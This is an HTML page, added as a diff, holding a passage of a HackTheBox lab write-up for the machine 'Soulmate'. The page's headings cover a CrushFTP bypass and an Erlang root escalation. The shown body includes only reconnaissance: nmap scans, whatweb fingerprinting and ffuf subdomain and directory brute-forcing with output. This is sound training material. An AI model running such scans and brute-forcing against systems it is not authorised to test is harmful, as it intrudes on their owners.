@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="preload" href="/assets/fonts/oxanium-variable.ttf" as="font" type="font/ttf" crossorigin />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+    
+    
+    <meta name="author" content="Gianluca Bassani" />
+
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    <!-- Single Page App redirect receiver for GitHub Pages -->
+    <script type="text/javascript">
+      (function(l) {
+        if (l.search[1] === '/' ) {
+          var decoded = l.search.slice(1).split('&').map(function(s) { 
+            return s.replace(/~and~/g, '&')
+          }).join('?');
+          window.history.replaceState(null, null,
+              l.pathname.slice(0, -1) + decoded + l.hash
+          );
+        }
+      }(window.location))
+    </script>
+    <script type="module" crossorigin src="/assets/index-Bt1iUacl.js"></script>
+    <link rel="stylesheet" crossorigin href="/assets/index-BFjX5Hv_.css">
+  
+    <link rel="stylesheet" href="/assets/ArticlePage-BEHUn5zE.css" />
+    <title>Soulmate | Gianluca Bassani</title>
+    <meta name="description" content="Exploited a CrushFTP authentication bypass vulnerability (CVE-2025-31161) to gain initial access, then used an exposed internal Erlang service to escalate privileges to root." />
+    <link rel="canonical" href="https://gianlucabassani.gitlab.io/boxes/hackthebox/soulmate/" />
+    <meta property="og:title" content="Soulmate | Gianluca Bassani" />
+    <meta property="og:description" content="Exploited a CrushFTP authentication bypass vulnerability (CVE-2025-31161) to gain initial access, then used an exposed internal Erlang service to escalate privileges to root." />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="https://gianlucabassani.gitlab.io/boxes/hackthebox/soulmate/" />
+    <meta property="og:site_name" content="Gianluca Bassani" />
+    <meta property="og:image" content="https://gianlucabassani.gitlab.io/assets/previews/writeup-soulmate.png" />
+    <meta property="og:image:alt" content="Soulmate | Gianluca Bassani" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="article:published_time" content="2025-09-11" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Soulmate | Gianluca Bassani" />
+    <meta name="twitter:description" content="Exploited a CrushFTP authentication bypass vulnerability (CVE-2025-31161) to gain initial access, then used an exposed internal Erlang service to escalate privileges to root." />
+    <meta name="twitter:image" content="https://gianlucabassani.gitlab.io/assets/previews/writeup-soulmate.png" />
+    <meta name="twitter:image:alt" content="Soulmate | Gianluca Bassani" />
+</head>
+
+  <body>
+    <div id="root"><a class="skip-link" href="#route-content">Skip to content</a><div role="region" aria-label="Notifications (F8)" tabindex="-1" style="pointer-events:none"><ol tabindex="-1" class="fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]"></ol></div><header class="site-navigation"><svg class="site-navigation-frame site-navigation-frame-desktop" viewBox="0 0 1200 88" preserveAspectRatio="none" aria-hidden="true"><path class="site-navigation-surface" d="M20 1H1167L1199 25V69H440L422 87H1V20Z"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-3;--trace-next:-40;--trace-last:-74;stroke-dasharray:2.8 97.2;animation-duration:8.3s;animation-delay:-2.1s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-17;--trace-next:-54;--trace-last:-88;stroke-dasharray:1.4 98.6;animation-duration:11.7s;animation-delay:-7.6s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:270 90% 78%;--trace-start:-31;--trace-next:-68;--trace-last:-2;stroke-dasharray:3.6 96.4;animation-duration:9.1s;animation-delay:-4.8s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-44;--trace-next:-81;--trace-last:-15;stroke-dasharray:1.8 98.2;animation-duration:13.3s;animation-delay:-9.2s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-53;--trace-next:-90;--trace-last:-24;stroke-dasharray:2.4 97.6;animation-duration:7.7s;animation-delay:-1.3s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:270 90% 78%;--trace-start:-66;--trace-next:-3;--trace-last:-37;stroke-dasharray:3.2 96.8;animation-duration:10.9s;animation-delay:-6.4s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-78;--trace-next:-15;--trace-last:-49;stroke-dasharray:1.2 98.8;animation-duration:12.7s;animation-delay:-3.5s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-88;--trace-next:-25;--trace-last:-59;stroke-dasharray:2.1 97.9;animation-duration:9.7s;animation-delay:-8.1s"></path></svg><svg class="site-navigation-frame site-navigation-frame-mobile" viewBox="0 0 400 82" preserveAspectRatio="none" aria-hidden="true"><path class="site-navigation-surface" d="M10 1H389L399 11V73L391 81H1V10Z"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-3;--trace-next:-40;--trace-last:-74;stroke-dasharray:2.8 97.2;animation-duration:8.3s;animation-delay:-2.1s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-17;--trace-next:-54;--trace-last:-88;stroke-dasharray:1.4 98.6;animation-duration:11.7s;animation-delay:-7.6s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:270 90% 78%;--trace-start:-31;--trace-next:-68;--trace-last:-2;stroke-dasharray:3.6 96.4;animation-duration:9.1s;animation-delay:-4.8s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-44;--trace-next:-81;--trace-last:-15;stroke-dasharray:1.8 98.2;animation-duration:13.3s;animation-delay:-9.2s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-53;--trace-next:-90;--trace-last:-24;stroke-dasharray:2.4 97.6;animation-duration:7.7s;animation-delay:-1.3s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:270 90% 78%;--trace-start:-66;--trace-next:-3;--trace-last:-37;stroke-dasharray:3.2 96.8;animation-duration:10.9s;animation-delay:-6.4s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-78;--trace-next:-15;--trace-last:-49;stroke-dasharray:1.2 98.8;animation-duration:12.7s;animation-delay:-3.5s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-88;--trace-next:-25;--trace-last:-59;stroke-dasharray:2.1 97.9;animation-duration:9.7s;animation-delay:-8.1s"></path></svg><div class="site-navigation-inner"><a class="site-brand" aria-label="Gianluca Bassani home" href="/"><span class="site-brand-copy"><span class="site-brand-name">Gianluca<span class="site-brand-break"><br/></span> Bassani</span><small><strong>0xPr1m3</strong><span class="site-brand-separator" aria-hidden="true">·</span><span class="site-brand-role">Cybersecurity</span></small></span></a><button class="site-menu-toggle" type="button" aria-controls="site-menu" aria-expanded="false" aria-label="Open navigation"><svg xmlns="http://www.w3.org/2000/svg" width="21" height="21" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-menu"><line x1="4" x2="20" y1="12" y2="12"></line><line x1="4" x2="20" y1="6" y2="6"></line><line x1="4" x2="20" y1="18" y2="18"></line></svg></button><nav id="site-menu" aria-label="Main navigation" class="site-menu"><a href="/about">About Me</a><a href="/projects">Projects</a><a href="/blog">Blog</a><a aria-current="page" href="/boxes">Box Writeups</a><a href="/ctf">CTF Solves</a><a href="/skills">Skills</a><a class="site-console-link" href="/terminal">CLI <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-up-right" aria-hidden="true"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a></nav></div></header><div id="route-content" tabindex="-1"><!--$--><div class="min-h-screen bg-background cyber-grid reader-page relative"><div aria-hidden="true" class="page-ambient page-ambient-scattered" style="--ambient-primary:hsl(152,75%,52%);--ambient-secondary:hsl(185,95%,48%);--ambient-tertiary:hsl(152,75%,52%)"></div><div class="fixed top-0 left-0 w-full h-1 bg-muted z-50"><div class="h-full transition-all duration-100" style="width:0%;background-image:var(--gradient-green)"></div></div><div class="bg-background/80 backdrop-blur-md border-b border-border relative z-10"><div class="reader-header mx-auto px-4 py-4"><div class="article-navigation"><nav aria-label="Article navigation"><a class="site-button inline-flex items-center justify-center gap-2 whitespace-nowrap text-sm font-medium disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 site-button-outline min-h-11 px-4 py-2 article-back-link" data-size="default" href="/"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-left" aria-hidden="true"><path d="m12 19-7-7 7-7"></path><path d="M19 12H5"></path></svg>Back to Home</a></nav><div class="article-reading-tools"><span><svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-clock" aria-hidden="true"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>2<!-- --> min read</span><button type="button"><svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-link" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>Copy link</button><span role="status"></span></div></div><div class="flex flex-wrap items-center gap-x-4 gap-y-2 mb-4"><div class="inline-flex items-center rounded-full border px-2.5 py-0.5 text-xs font-semibold transition-colors focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 hover:bg-secondary/15 tag bg-success/20 border-success/40 text-success">EASY</div><img class="machine-icon" src="/assets/htb/soulmate.png" alt="Soulmate machine icon" width="48" height="48"/><span class="text-sm text-muted-foreground font-mono">HACKTHEBOX</span></div><h1 class="text-2xl sm:text-3xl font-display font-bold reader-title mb-2 tracking-tight">Soulmate</h1><div class="flex flex-wrap items-center gap-x-4 gap-y-2 text-sm text-muted-foreground"><div class="flex items-center gap-1"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-calendar w-4 h-4"><path d="M8 2v4"></path><path d="M16 2v4"></path><rect width="18" height="18" x="3" y="4" rx="2"></rect><path d="M3 10h18"></path></svg>11 Sept 2025</div><div class="flex items-center gap-1"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-shield w-4 h-4"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path></svg>linux<!-- --> machine</div></div></div></div><main id="main-content" class="reader-layout reader-container mx-auto relative z-10 " tabindex="-1"><aside class="reader-sidebar"><div class="reader-toc reader-toc-desktop"><p>On this page</p><nav aria-label="Article chapters"><a href="#section-1-external-enumeration" class="">1. External Enumeration</a><a href="#section-tcp-aggressive-scan" class="reader-toc-subsection">TCP Aggressive Scan</a><a href="#section-udp-version-scan-top-100-ports" class="reader-toc-subsection">UDP Version Scan (Top 100 ports)</a><a href="#section-2-web-enumeration" class="">2. Web Enumeration</a><a href="#section-host-configuration" class="reader-toc-subsection">Host Configuration</a><a href="#section-whatweb-analysis" class="reader-toc-subsection">WhatWeb Analysis</a><a href="#section-subdomain-enumeration" class="reader-toc-subsection">Subdomain Enumeration</a><a href="#section-directory-bruteforcing" class="reader-toc-subsection">Directory Bruteforcing</a><a href="#section-application-exploration" class="reader-toc-subsection">Application Exploration</a><a href="#section-3-exploitation" class="">3. Exploitation</a><a href="#section-crushftp-exploit-cve-2025-31161" class="reader-toc-subsection">CrushFTP Exploit (CVE-2025-31161)</a><a href="#section-access-to-bens-account" class="reader-toc-subsection">Access to Ben&#x27;s Account</a><a href="#section-credential-hunting" class="reader-toc-subsection">Credential Hunting</a><a href="#section-ssh-access" class="reader-toc-subsection">SSH Access</a><a href="#section-4-privilege-escalation" class="">4. Privilege Escalation</a><a href="#section-system-info" class="reader-toc-subsection">System Info</a><a href="#section-suid-capabilities" class="reader-toc-subsection">SUID &amp; Capabilities</a><a href="#section-local-services" class="reader-toc-subsection">Local Services</a><a href="#section-erlang-service-exploit" class="reader-toc-subsection">Erlang Service Exploit</a><a href="#section-erlang-service-exploit-1" class="reader-toc-subsection">Erlang Service Exploit</a><a href="#section-conclusions" class="">Conclusions</a></nav></div><details class="reader-toc reader-toc-mobile"><summary>On this page <span>21<!-- --> chapters</span></summary><nav aria-label="Article chapters"><a href="#section-1-external-enumeration" class="">1. External Enumeration</a><a href="#section-tcp-aggressive-scan" class="reader-toc-subsection">TCP Aggressive Scan</a><a href="#section-udp-version-scan-top-100-ports" class="reader-toc-subsection">UDP Version Scan (Top 100 ports)</a><a href="#section-2-web-enumeration" class="">2. Web Enumeration</a><a href="#section-host-configuration" class="reader-toc-subsection">Host Configuration</a><a href="#section-whatweb-analysis" class="reader-toc-subsection">WhatWeb Analysis</a><a href="#section-subdomain-enumeration" class="reader-toc-subsection">Subdomain Enumeration</a><a href="#section-directory-bruteforcing" class="reader-toc-subsection">Directory Bruteforcing</a><a href="#section-application-exploration" class="reader-toc-subsection">Application Exploration</a><a href="#section-3-exploitation" class="">3. Exploitation</a><a href="#section-crushftp-exploit-cve-2025-31161" class="reader-toc-subsection">CrushFTP Exploit (CVE-2025-31161)</a><a href="#section-access-to-bens-account" class="reader-toc-subsection">Access to Ben&#x27;s Account</a><a href="#section-credential-hunting" class="reader-toc-subsection">Credential Hunting</a><a href="#section-ssh-access" class="reader-toc-subsection">SSH Access</a><a href="#section-4-privilege-escalation" class="">4. Privilege Escalation</a><a href="#section-system-info" class="reader-toc-subsection">System Info</a><a href="#section-suid-capabilities" class="reader-toc-subsection">SUID &amp; Capabilities</a><a href="#section-local-services" class="reader-toc-subsection">Local Services</a><a href="#section-erlang-service-exploit" class="reader-toc-subsection">Erlang Service Exploit</a><a href="#section-erlang-service-exploit-1" class="reader-toc-subsection">Erlang Service Exploit</a><a href="#section-conclusions" class="">Conclusions</a></nav></details></aside><div class="reader-body"><section class="reader-summary" aria-label="Article introduction"><p class="reader-summary-text">Exploited a CrushFTP authentication bypass vulnerability (CVE-2025-31161) to gain initial access, then used an exposed internal Erlang service to escalate privileges to root.</p><ul class="reader-summary-topics" aria-label="Topics"><li>CrushFTP</li><li>Erlang</li></ul></section><div style="--hover-theme:var(--theme-green)" class="rounded-lg border bg-card text-card-foreground shadow-sm relative overflow-hidden reader-article theme-green border-success/20"><div class="p-6 pt-0 reader-content"><div class="prose prose-invert prose-green reader-prose"><h2 id="section-1-external-enumeration"><a href="#section-1-external-enumeration" class="heading-link">1. External Enumeration</a></h2>
+<h3 id="section-tcp-aggressive-scan"><a href="#section-tcp-aggressive-scan" class="heading-link">TCP Aggressive Scan</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>shell</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="shell block, horizontally scrollable"><code class="hljs language-shell">nmap -A -sV -sC -p- --open -T4 10.129.58.9
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Soulmate - Find Your Perfect Match
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div>
+<p><strong>Findings / Motivation:</strong></p>
+<ul>
+<li>Port 22: Exposed SSH service (OpenSSH 8.9p1).</li>
+<li>Port 80: HTTP service (nginx 1.18.0) with &quot;Soulmate&quot; web application.</li>
+</ul>
+<hr/>
+<h3 id="section-udp-version-scan-top-100-ports"><a href="#section-udp-version-scan-top-100-ports" class="heading-link">UDP Version Scan (Top 100 ports)</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>shell</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="shell block, horizontally scrollable"><code class="hljs language-shell">nmap -sU -sV -F -T5 --open --max-retries 1 10.129.58.9
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>All 100 scanned ports on soulmate.htb (10.129.58.9) are in ignored states.
+Not shown: 92 open|filtered udp ports (no-response), 8 closed udp ports (port-unreach)
+</code></pre></div>
+<p><strong>Findings:</strong></p>
+<ul>
+<li>No interesting UDP ports detected.</li>
+</ul>
+<hr/>
+<h2 id="section-2-web-enumeration"><a href="#section-2-web-enumeration" class="heading-link">2. Web Enumeration</a></h2>
+<h3 id="section-host-configuration"><a href="#section-host-configuration" class="heading-link">Host Configuration</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>shell</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="shell block, horizontally scrollable"><code class="hljs language-shell">echo &#x27;10.129.58.9 soulmate.htb&#x27; | sudo tee -a /etc/hosts
+</code></pre></div>
+<hr/>
+<h3 id="section-whatweb-analysis"><a href="#section-whatweb-analysis" class="heading-link">WhatWeb Analysis</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>shell</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="shell block, horizontally scrollable"><code class="hljs language-shell">whatweb soulmate.htb
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>http://soulmate.htb [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[hello@soulmate.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.58.9], Script, Title[Soulmate - Find Your Perfect Match], nginx[1.18.0]
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>shell</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="shell block, horizontally scrollable"><code class="hljs language-shell">whatweb ftp.soulmate.htb
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>http://ftp.soulmate.htb [302 Found] Cookies[CrushAuth,currentAuth], Country[RESERVED][ZZ], CrushFTP, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[CrushAuth], IP[10.129.58.9], RedirectLocation[/WebInterface/login.html], nginx[1.18.0]
+http://ftp.soulmate.htb/WebInterface/login.html [200 OK] Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.58.9], Script[module,text/javascript,text/javascript&gt;const], Title[CrushFTP WebInterface], X-UA-Compatible[chrome=1], nginx[1.18.0]
+</code></pre></div>
+<p><strong>Findings:</strong></p>
+<ul>
+<li>Main site: Soulmate with Bootstrap framework.</li>
+<li>Subdomain ftp.soulmate.htb hosting CrushFTP with web interface.</li>
+</ul>
+<hr/>
+<h3 id="section-subdomain-enumeration"><a href="#section-subdomain-enumeration" class="heading-link">Subdomain Enumeration</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>shell</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="shell block, horizontally scrollable"><code class="hljs language-shell">ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://soulmate.htb -H &#x27;Host: FUZZ.soulmate.htb&#x27; -fs 154
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 70ms]
+</code></pre></div>
+<p><strong>Findings:</strong></p>
+<ul>
+<li>Subdomain <code>ftp.soulmate.htb</code> discovered, redirects to CrushFTP WebInterface.</li>
+</ul>
+<hr/>
+<h3 id="section-directory-bruteforcing"><a href="#section-directory-bruteforcing" class="heading-link">Directory Bruteforcing</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>shell</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="shell block, horizontally scrollable"><code class="hljs language-shell">ffuf -u http://soulmate.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 33ms]
+index.php               [Status: 200, Size: 16688, Words: 6110, Lines: 306, Duration: 32ms]
+</code></pre></div>
+<p><strong>Findings:</strong></p>
+<ul>
+<li>Directory <code>/assets</code> and file <code>index.php</code> detected.</li>
+</ul>
+<hr/>
+<h3 id="section-application-exploration"><a href="#section-application-exploration" class="heading-link">Application Exploration</a></h3>
+<ul>
+<li>Main Soulmate site allows registration and login.</li>
+</ul>
+<p><button type="button" class="reader-image" aria-label="Enlarge image: soulmate_1"><img src="/assets/soulmate/soulmate_1.jpg" alt="soulmate_1" width="1280" height="696" loading="lazy" decoding="async"/><span>Tap to enlarge</span></button></p>
+<ul>
+<li>
+<p>No XSS vulnerability found.</p>
+</li>
+<li>
+<p>No upload vulnerability found.</p>
+</li>
+<li>
+<p>Subdomain ftp hosts CrushFTP with login panel.</p>
+</li>
+</ul>
+<p><button type="button" class="reader-image" aria-label="Enlarge image: soulmate_2"><img src="/assets/soulmate/soulmate_2.png" alt="soulmate_2" width="427" height="472" loading="lazy" decoding="async"/><span>Tap to enlarge</span></button></p>
+<hr/>
